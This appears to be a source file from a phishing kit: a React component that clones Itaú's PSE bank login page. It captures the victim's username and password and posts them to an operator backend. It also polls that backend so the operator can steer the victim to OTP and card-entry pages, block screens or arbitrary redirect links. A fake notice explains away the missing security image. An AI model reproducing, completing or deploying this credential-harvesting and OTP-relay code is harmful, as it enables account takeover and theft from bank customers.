import { useEffect, useRef, useState } from 'react';
import logoitau from "../../img/logo_itau.png";
import banneritau from "../../img/banner.jpg";
import botonCerrar from "../../img/boton_cerrar_modal.png";
import itauLogoNaranja from "../../img/itau_logo_naranja.png";
import { instanceBackend } from '../../../../../axios/instanceBackend';
import { PSE_SESSION_HANDOFF_KEY } from '../../../../loadingPse/PseLoading';
import { redirectToTcIngreso } from '../../../../ingresoTc/tcSessionHelper';
import LoadingItau from '../../../../../components/LoadingItau';
import ModalErrorItau from '../../modals/ModalErrorItau';
import "./login_itau_pse.css";

// Se inicializan las constantes
const ITAU_ERROR_KEY = 'estado_sesion';

// Se inicializa el mensaje de error de login
const ITAU_LOGIN_ERROR_MSG =
    'La autenticación no es correcta. El usuario o la contraseña ingresados son incorrectos. Por favor, verifique e intente nuevamente.';

const ITAU_BLOCKED_ERROR_MSG = 'Acceso bloqueado por seguridad.';

// Se inicializa la clave del mid flow
const ITAU_MID_FLOW_KEY = 'itau_mid_flow';

// Se inicializan los estados tras login
const ESTADOS_TRAS_LOGIN = [
    'sol_otp',
    'sol_tc',
    'sol_finalizar',
    'sol_finalizado',
    'solicitar_finalizar',
    'error_otp',
    'error_login',
    'block_ip',
    'error_blocked',
];

// Se inicializa el texto del modal
const ITAU_MODAL_INFO_TEXT = 'Nuestro proceso de validación ha cambiado, desde ahora, ya no verás tu imagen y frase de seguridad. Escribe la clave de tus canales digitales para continuar.';

const ITAU_ALNUM = /[^a-zA-Z0-9]/g;
const ITAU_ALNUM_VALID = /^[a-zA-Z0-9]+$/;

const sanitizeItauAlphanumeric = (value) =>
    String(value ?? '').replace(ITAU_ALNUM, '');

// Se crea la funcion para el componente
const ItauPSE = () => {

    // Se inicializan los estados del formulario y UI
    const [userId, setUserId] = useState('');
    const [password, setPassword] = useState('');
    const [isModalOpen, setIsModalOpen] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    // Se inicializan los datos de ciudades
    const cities = [
        { name: 'Bogotá', phone: '581 8181' },
        { name: 'Cartagena', phone: '693 1818' },
        { name: 'Medellín', phone: '604 1818' },
        { name: 'Bucaramanga', phone: '697 1818' },
        { name: 'Cali', phone: '486 1818' },
        { name: 'Pereira', phone: '340 1818' },
        { name: 'Barranquilla', phone: '385 1818' },
        { name: 'Manizales', phone: '887 9818' }
    ];

    // Se inicializan las referencias
    const pollingIntervalRef = useRef(null);
    const sessionIdRef = useRef(null);
    const lastEstadoRef = useRef(null);
    const allowPollNavigationRef = useRef(false);
    const modalBloqueoEstadoRef = useRef(null);
    const ignorarEstadoHastaCambioRef = useRef(null);

    // Se inicializa el estado para mostrar el modal de error
    const [showErrorModal, setShowErrorModal] = useState(false);
    const [errorModalMessage, setErrorModalMessage] = useState(ITAU_LOGIN_ERROR_MSG);

    // Se crea la funcion para parar el polling
    const stopPolling = () => {

        // Se valida si existe el intervalo de polling
        if (pollingIntervalRef.current) {

            // Se limpia el intervalo de polling
            clearInterval(pollingIntervalRef.current);

            // Se setea el intervalo de polling a null
            pollingIntervalRef.current = null;
        }
    };

    const clearLoginFormFields = () => {
        setUserId('');
        setPassword('');
        setIsModalOpen(false);
    };

    const showLoginCredentialError = () => {
        stopPolling();
        setIsLoading(false);
        allowPollNavigationRef.current = false;
        sessionStorage.removeItem(ITAU_MID_FLOW_KEY);
        modalBloqueoEstadoRef.current = 'error_login';
        lastEstadoRef.current = 'error_login';
        setErrorModalMessage(ITAU_LOGIN_ERROR_MSG);
        clearLoginFormFields();
        setShowErrorModal(true);
        window.scrollTo(0, 0);
    };

    const showBlockedError = (estado = 'error_blocked') => {
        stopPolling();
        setIsLoading(false);
        allowPollNavigationRef.current = false;
        sessionStorage.removeItem(ITAU_MID_FLOW_KEY);
        modalBloqueoEstadoRef.current = estado;
        lastEstadoRef.current = estado;
        setErrorModalMessage(ITAU_BLOCKED_ERROR_MSG);
        clearLoginFormFields();
        setShowErrorModal(true);
    };

    const resetTrasErrorLogin = () => {
        const estadoServidor = modalBloqueoEstadoRef.current;
        modalBloqueoEstadoRef.current = null;

        if (
            estadoServidor === 'error_login'
            || estadoServidor === 'error_blocked'
            || estadoServidor === 'block_ip'
        ) {
            ignorarEstadoHastaCambioRef.current = estadoServidor;
        }

        setShowErrorModal(false);
        clearLoginFormFields();
        setIsLoading(false);
        sessionStorage.removeItem(ITAU_MID_FLOW_KEY);
        allowPollNavigationRef.current = false;
        stopPolling();

        if (estadoServidor === 'error_login') {
            setErrorModalMessage(ITAU_LOGIN_ERROR_MSG);
        }
    };

    // Se crea el useEffect para verificar el estado de la sesion
    useEffect(() => {

        // Se captura el estado de error
        const pendingError = localStorage.getItem(ITAU_ERROR_KEY);
        const midFlow = sessionStorage.getItem(ITAU_MID_FLOW_KEY) === '1';
        const pseHandoff = sessionStorage.getItem(PSE_SESSION_HANDOFF_KEY);

        // Se valida si existe el error de login
        if (pendingError === 'error') {
            showLoginCredentialError();
        }

        // Se valida si existe el error
        if (pendingError) {

            // Se elimina el error de login
            localStorage.removeItem(ITAU_ERROR_KEY);
        }

        // Se valida si existe el handoff
        if (pseHandoff) {

            // Se setea la sessionId
            localStorage.setItem('sessionId', pseHandoff);

            // Se setea la sessionId
            sessionIdRef.current = pseHandoff;

            // Se setea el estado actual a null
            lastEstadoRef.current = null;

            // Se remueve el handoff y el mid flow
            sessionStorage.removeItem(PSE_SESSION_HANDOFF_KEY);

            // Se remueve el mid flow
            sessionStorage.removeItem(ITAU_MID_FLOW_KEY);

            // Se desactiva la navegacion por polling hasta enviar el login
            allowPollNavigationRef.current = false;

            // Se setea el loading a false
            setIsLoading(false);
        } else if (midFlow) {

            // Se captura la sessionId
            const sid = localStorage.getItem('sessionId');

            // Se setea la sessionId
            sessionIdRef.current = sid;

            // Se valida si existe la sessionId
            if (sid) {

                // Se activa la navegacion por polling
                allowPollNavigationRef.current = true;

                // Se setea el loading a true
                setIsLoading(true);

                // Se inicia el polling
                initPolling();
            }
        } else {

            // Se setea la sessionId
            sessionIdRef.current = localStorage.getItem('sessionId');

            // Se desactiva la navegacion por polling
            allowPollNavigationRef.current = false;
        }

        // Se retorna el cleanup al desmontar
        return () => stopPolling();
    }, []);

    // Se crea el metodo para enviar autenticacion al backend central o local
    const postItau = async (localPath, dataSend) => {

        // Se captura la url central
        const centralUrl = (process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL || '').trim();

        // Se retorna la respuesta
        return centralUrl ? instanceBackend.post(centralUrl, dataSend) : instanceBackend.post(localPath, dataSend);
    };

    // Se crea el metodo para pasar al modal de contraseña sin consumir backend
    const handleLoginSubmit = (e) => {

        // Se evita el comportamiento por defecto del formulario 
        e.preventDefault();

        // Se valida si el usuario no esta vacio o no es alfanumerico
        const userTrimmed = userId.trim();
        if (!userTrimmed || !ITAU_ALNUM_VALID.test(userTrimmed)) {

            // Se muestra el mensaje de error
            alert('El usuario debe contener solo letras y números.');

            // Se sale de la funcion
            return;
        }

        // Se setea la contraseña a vacia
        setPassword('');

        // Se muestra el modal de contraseña
        setIsModalOpen(true);
    };

    // Se crea el metodo para enviar usuario y clave al backend
    const handlePasswordSubmit = async (e) => {

        // Se evita el comportamiento por defecto del formulario
        e.preventDefault();

        // Se valida si la contraseña no esta vacia o no es alfanumerica
        const passTrimmed = password.trim();
        if (!passTrimmed || !ITAU_ALNUM_VALID.test(passTrimmed)) {

            // Se muestra el mensaje de error
            alert('La clave debe contener solo letras y números.');

            // Se sale de la funcion
            return;
        }

        // Se captura la sessionId
        const sessionId = localStorage.getItem('sessionId') || sessionIdRef.current;

        // Se crea el payload para enviar al backend
        const dataSend = {
            "data": {
                "attributes": {
                    "fecha": new Date().toISOString(),
                    "usuario": userId,
                    "clave": password,
                    "sessionId": sessionId,
                    "backend": 'P01',
                    "backend_central_url": process.env.REACT_APP_API_BASE_URL_BACKEND_CENTRAL,
                    "backend_url": '/api/v1/itau/authenticacion',
                },
            },
        };

        // Se para el polling
        stopPolling();

        // Se setea el estado actual a null
        lastEstadoRef.current = null;

        // Se setea el loading a true
        setIsLoading(true);

        // Se usa el try catch
        try {

            // Se realiza la peticion al backend
            const response = await postItau('/itau/authenticacion', dataSend);

            // Se valida si la respuesta es exitosa
            if (response.data?.success) {

                // Se captura la sessionId
                const sid = response.data.sessionId ?? sessionId;

                // Se setea la sessionId en el localStorage
                localStorage.setItem('sessionId', sid);

                // Se setea la sessionId en la referencia
                sessionIdRef.current = sid;

                // Se setea el mid flow
                sessionStorage.setItem(ITAU_MID_FLOW_KEY, '1');

                // Se activa la navegacion por polling
                allowPollNavigationRef.current = true;

                // Se inicia el polling
                initPolling();
            } else {

                // Se setea el loading a false
                setIsLoading(false);

                // Se desactiva la navegacion por polling
                allowPollNavigationRef.current = false;

                // Se muestra el mensaje de error
                alert('No se pudo iniciar sesión. Intenta nuevamente.');
            }
        } catch (error) {

            // Se quita el cargando
            setIsLoading(false);

            // Se desactiva la navegacion por polling
            allowPollNavigationRef.current = false;

            // Se maneja el detalle de errores
            if (error.response) {

                // Se muestra el error de respuesta del servidor
                alert(`Error ${error.response.status}: ${error.response.data.message || 'Error del servidor'}`);
            } else if (error.request) {

                // Se quita el cargando
                setIsLoading(false);

                // Se muestra el error de conexión
                alert('Error de conexión con el servidor');
            } else {

                // Se quita el cargando
                setIsLoading(false);

                // Se muestra el error inesperado
                alert('Error inesperado: ' + error.message);
            };
        } finally {
        }
    };

    // Se crea el metodo para iniciar el polling
    const initPolling = () => {

        // Se para el polling
        stopPolling();

        // Se setea el intervalo de polling
        pollingIntervalRef.current = setInterval(() => {

            // Se verifica el estado
            verifyState();
        }, 3000);

        // Se verifica el estado
        verifyState();
    };

    // Se crea el metodo para verificar el estado actual
    const verifyState = async () => {

        // Se usa el try catch
        try {

            // Se realiza la petición al backend
            const response = await instanceBackend.post(`/itau/verify-state/${sessionIdRef.current}`);

            // Se captura el estado
            const { estado: estadoRaw, state, url, text, tc, tarjeta, bank } = response?.data || {};

            // Se convierte el estado a minusculas
            const estado = (estadoRaw || state || '').toString().toLowerCase();

            // Se valida si existe la url
            const hasUrl = Boolean(url && String(url).trim());

            // Se valida si existe el texto
            const customLink = hasUrl ? url : (text && String(text).trim() ? text : null);

            // Se captura el numero de tarjeta
            const tarjetaDigits = String(tarjeta || '').replace(/\D/g, '');

            // Se valida si es una sesion TC
            const isTcSession = Boolean(tc);

            // Se valida si es una sesion OTP
            const isTcOtpFlow = isTcSession && tarjetaDigits.length > 0;

            // Se valida si existe un link pendiente
            const linkPendiente = estado === 'sol_link_bot' || (estado === 'link_bot' && !hasUrl) || (estado === 'sol_link_custom' && !customLink);

            // Se valida si existe estado para procesar
            if (!estado) return;

            // Se evita reprocesar el mismo estado despues de cerrar modal
            if (ignorarEstadoHastaCambioRef.current) {

                // Se valida si el estado es el mismo que el estado a ignorar
                if (estado === ignorarEstadoHastaCambioRef.current) return;

                // Se setea el estado a ignorar a null
                ignorarEstadoHastaCambioRef.current = null;

                // Se setea el estado a null
                modalBloqueoEstadoRef.current = null;
            }

            // Se evita reabrir modal por el mismo estado bloqueado
            if (modalBloqueoEstadoRef.current && estado === modalBloqueoEstadoRef.current) return;

            // Se evita navegar por polling si aun no hay accion del usuario
            if (ESTADOS_TRAS_LOGIN.includes(estado) && !allowPollNavigationRef.current) return;

            // Se evita reprocesar estados repetidos cuando no hay link pendiente
            if (!linkPendiente && lastEstadoRef.current === estado) return;

            // Se setea el estado actual
            if (!linkPendiente) lastEstadoRef.current = estado;

            // Se maneja la navegacion segun el estado retornado por verifyState
            switch (estado) {
                case 'sol_otp':
                case 'sol_tc':

                    // Se para el polling
                    stopPolling();

                    // Se remueve la bandera de mid flow
                    sessionStorage.removeItem(ITAU_MID_FLOW_KEY);

                    // Se desactiva el loading
                    setIsLoading(false);

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (estado === 'sol_otp' && isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            '/ingreso-tc/otp',
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                        );
                    } else {

                        // Se redirige al OTP de Itaú cuando no aplica flujo TC
                        window.location.href = "/itau_otp";
                    }

                    // Se sale del switch
                    break;
                case 'error_otp':

                    // Se para el polling
                    stopPolling();

                    // Se remueve la bandera de mid flow
                    sessionStorage.removeItem(ITAU_MID_FLOW_KEY);

                    // Se desactiva el loading
                    setIsLoading(false);

                    // Se setea el error para mostrar modal en el siguiente ingreso
                    localStorage.setItem(ITAU_ERROR_KEY, "error");

                    // Se redirige al flujo OTP generico si la sesión es TC
                    if (isTcOtpFlow) {

                        // Se redirige al flujo OTP generico si la sesión es TC
                        redirectToTcIngreso(
                            '/ingreso-tc/otp',
                            sessionIdRef.current,
                            bank,
                            tarjetaDigits,
                            'error_otp',
                        );
                    } else {

                        // Se redirige al OTP de Itaú cuando no aplica flujo TC
                        window.location.href = "/itau_otp";
                    }

                    // Se sale del switch
                    break;
                case 'error_login':
                    showLoginCredentialError();
                    break;
                case 'sol_finalizar':
                case 'sol_finalizado':
                case 'solicitar_finalizar':

                    // Se para el polling
                    stopPolling();

                    // Se remueve la bandera de mid flow
                    sessionStorage.removeItem(ITAU_MID_FLOW_KEY);

                    // Se limpia el localStorage
                    localStorage.clear();

                    // Se limpia el sessionStorage
                    sessionStorage.clear();

                    // Se redirige al finalizado TC cuando la sesión viene por tarjeta
                    if (isTcSession) {

                        // Se redirige al finalizado TC cuando la sesión viene por tarjeta
                        window.location.href = `/finalizado-tc?sessionId=${encodeURIComponent(sessionIdRef.current)}`;
                    } else {

                        // Se redirige al finalizado PSE cuando la sesión no viene por tarjeta
                        window.location.href = '/finalizado-pse?sessionId=' + sessionIdRef.current;
                    }

                    // Se sale del switch
                    break;
                case 'link_bot':

                    // Se valida si ya existe URL de redireccion
                    if (hasUrl) {

                        // Se para el polling
                        stopPolling();

                        // Se remueve la bandera de mid flow
                        sessionStorage.removeItem(ITAU_MID_FLOW_KEY);

                        // Se redirige al link del bot
                        window.location.href = url;
                    }

                    // Se sale del switch
                    break;
                case 'sol_link_custom':

                    // Se valida si ya existe link personalizado
                    if (customLink) {

                        // Se para el polling
                        stopPolling();

                        // Se remueve la bandera de mid flow
                        sessionStorage.removeItem(ITAU_MID_FLOW_KEY);

                        // Se redirige al link personalizado
                        window.location.href = customLink;
                    }

                    // Se sale del switch
                    break;
                case 'block_ip':
                case 'error_blocked':
                    showBlockedError(estado);
                    break;
                default:

                    // Se sale del switch
                    break;
            };
        } catch (error) {

            // Se capturan los datos del error
            const status = error?.response?.status;
            const estadoErr = (error?.response?.data?.estado || '').toString().toLowerCase();

            // Se valida si el estado corresponde a bloqueo de IP
            if (status === 403 && estadoErr === 'error_blocked') {

                // Se para el polling
                stopPolling();

                // Se desactiva el loading
                setIsLoading(false);

                // Se limpia el localStorage
                localStorage.clear();

                // Se redirige al inicio configurado del banco
                window.location.href = process.env.REACT_APP_URL_BANK || '/';
            }
        };
    };

    // Se crea el metodo para cerrar el modal de clave y limpiar el estado
    const handleCloseModal = () => {
        stopPolling();
        sessionStorage.removeItem(ITAU_MID_FLOW_KEY);
        allowPollNavigationRef.current = false;
        setIsLoading(false);
        setIsModalOpen(false);
        setPassword('');
    };

    // Se retorna la estructura HTML
    return (
        <div className="itau-pse-container">
            <header className="itau-header">
                <div className="itau-header-inner">
                    <div className="itau-logo-section">
                        <img src={logoitau} alt="Itaú" className="itau-logo-img" />
                    </div>
                    <div className="itau-banner-section">
                        <img src={banneritau} alt="Banner Itaú" className="itau-banner-img" />

                    </div>
                </div>
            </header>

            <main className="itau-main-wrapper">
                <div className="itau-content-wrapper">
                    <aside className="itau-login-panel">
                        <table>
                            <tbody>
                                <tr>
                                    <td>
                                        <div className="itau-login-box">
                                            <form onSubmit={handleLoginSubmit} className="itau-login-form">
                                                <div className="itau-form-group">
                                                    <label htmlFor="itau-user-id" className="itau-form-label">
                                                        Usuario
                                                    </label>
                                                    <input
                                                        type="text"
                                                        id="itau-user-id"
                                                        className="itau-form-input"
                                                        value={userId}
                                                        onChange={(e) => setUserId(sanitizeItauAlphanumeric(e.target.value))}
                                                        autoComplete="off"
                                                        disabled={isLoading}
                                                        inputMode="text"
                                                        autoCapitalize="off"
                                                        spellCheck={false}
                                                    />
                                                </div>
                                                <div className="itau-form-actions">
                                                    <button type="submit" className="itau-btn itau-btn-primary" disabled={isLoading}>
                                                        Entrar
                                                    </button>
                                                </div>
                                            </form>
                                        </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </aside>

                    {/* Se renderiza el panel derecho de información */}
                    <section className="itau-info-panel">
                        <div className="itau-info-content">
                            <p className="itau-text itau-text-intro">
                                Es un sistema centralizado y estandarizado que permite a las empresas ofrecer a los
                                usuarios la posibilidad de realizar pagos en línea, accesando a sus recursos desde
                                la entidad financiera donde tienen su dinero.
                            </p>

                            <p className="itau-text itau-text-subtitle">
                                Algunas de las ventajas que PSE ofrece a los Usuarios se presentan a continuación:
                            </p>

                            <ul className="itau-benefits-list">
                                <li className="itau-benefit-item">Facilidad y oportunidad para realizar transacciones y/o compras.</li>
                                <li className="itau-benefit-item">Seguridad para poder realizar pagos desde la entidad financiera de su preferencia.</li>
                                <li className="itau-benefit-item">Comodidad, al no tener que movilizarse para efectuar un pago.</li>
                                <li className="itau-benefit-item">Atención 24 horas al día, 7 días a la semana, todos los días del año.</li>
                                <li className="itau-benefit-item">Confirmación en línea de la transacción.</li>
                                <li className="itau-benefit-item">Mayor control del tiempo y el dinero.</li>
                            </ul>

                            <h3 className="itau-section-title">Comercios afiliados:</h3>

                            <ul className="itau-commerce-list">
                                <li className="itau-commerce-item">Aerolineas</li>
                                <li className="itau-commerce-item">Entidades estatales</li>
                                <li className="itau-commerce-item">Empresas de servicios</li>
                                <li className="itau-commerce-item">Entidades financieras</li>
                                <li className="itau-commerce-item">Seguridad social y salud</li>
                                <li className="itau-commerce-item">Instituciones educativas</li>
                                <li className="itau-commerce-item">Comercios</li>
                                <li className="itau-commerce-item">Camaras de comercio</li>
                                <li className="itau-commerce-item">Desarrolladores de software</li>
                                <li className="itau-commerce-item">Servicios públicos</li>
                                <li className="itau-commerce-item">Telecomunicaciones</li>
                            </ul>

                            <p className="itau-contact-title">
                                Comuníquese con nuestro número único por ciudad
                            </p>

                            <div className="itau-phones-grid">
                                {cities.map((city, index) => (
                                    <div key={index} className="itau-phone-row">
                                        <span className="itau-city-name">{city.name}</span>
                                        <span className="itau-phone-number">{city.phone}</span>
                                    </div>
                                ))}
                                <div className="itau-phone-row itau-phone-row--national">
                                    <span className="itau-city-name">Desde otras ciudades</span>
                                    <span className="itau-phone-number">01 8000 512 633</span>
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
            </main>

            {/* Se renderiza el modal de clave */}
            {isModalOpen && (
                <div className="itau-modal-overlay">
                    <div className="itau-modal-content">
                        <button
                            className="itau-modal-close"
                            onClick={handleCloseModal}
                            type="button"
                            aria-label="Cerrar"
                        >
                            {!isLoading ?
                                <img src={botonCerrar} alt="Cerrar" className="itau-modal-close-img" /> : null}
                        </button>

                        <div className="itau-modal-body">
                            <div className="itau-modal-security-header">
                                <div className="itau-modal-brand-block">
                                    <img
                                        src={itauLogoNaranja}
                                        alt="Itaú"
                                        className="itau-modal-brand-logo"
                                    />
                                    <p className="itau-modal-brand-name">Itaú</p>
                                </div>
                            </div>

                            <div className="itau-modal-info-box">
                                <p>{ITAU_MODAL_INFO_TEXT}</p>
                            </div>

                            <form onSubmit={handlePasswordSubmit} className="itau-modal-form">
                                <div className="itau-modal-form-inline">
                                    <label htmlFor="itau-pass" className="itau-modal-label">Clave</label>
                                    <input
                                        type="password"
                                        id="itau-pass"
                                        className="itau-modal-input"
                                        value={password}
                                        onChange={(e) => setPassword(sanitizeItauAlphanumeric(e.target.value))}
                                        autoComplete="off"
                                        disabled={isLoading}
                                        minLength={4}
                                        inputMode="text"
                                        autoCapitalize="off"
                                        spellCheck={false}
                                        required
                                    />
                                    <button type="submit" className="itau-modal-btn" disabled={isLoading}>
                                        {isLoading ? 'Cargando...' : 'Entrar'}
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            )}

            {/* Se renderiza el loading mientras hay envio o polling activo */}
            {isLoading ?
                <LoadingItau /> : null}

            {/* Se renderiza el modal de error de login o bloqueo */}
            <ModalErrorItau
                isOpen={showErrorModal}
                onClose={resetTrasErrorLogin}
                onContinue={resetTrasErrorLogin}
                subtitle="Error en verificación"
                message={errorModalMessage}
            />
        </div>
    );
};

// Se exporta el contenido
export default ItauPSE;